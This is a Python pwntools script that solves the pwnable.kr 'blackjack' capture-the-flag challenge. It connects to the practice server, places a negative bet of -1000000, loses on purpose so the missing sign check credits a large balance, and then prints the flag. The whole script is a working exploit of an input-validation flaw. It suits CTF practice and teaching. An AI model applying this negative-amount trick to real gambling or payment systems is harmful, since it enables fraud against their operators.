#!/usr/bin/python3


from pwn import *


con = remote('pwnable.kr', 9009)

# Get to the actual game.
print('### CONNECTED ###')
con.recvuntil('N)\n')
con.sendline('y')
print('### AGGREED TO PLAY ###')
con.recvuntil(': ')
con.sendline('1')
print('### SELECTED 1 TO PLAY THE GAME ###')
con.recvuntil('Bet: $')

# Bet -1000000 cash
con.sendline(str(-1000000))
print('### BETTED ###')
con.recvuntil('Stay.\n')

# Select to stay - lose on purpose.
con.sendline('s')
print('### CHOSE TO STAY - LOSING ON PURPOSE ###')
con.recvuntil('for No\n')

# Select to play again, for the game to check if we are milionares
con.sendline('y')
print('### SELECTED TO PLAY AGAIN - SHOW TO FLAG ###')
print('[+] flag = {}'.format(con.recvline()[10:-1].decode()))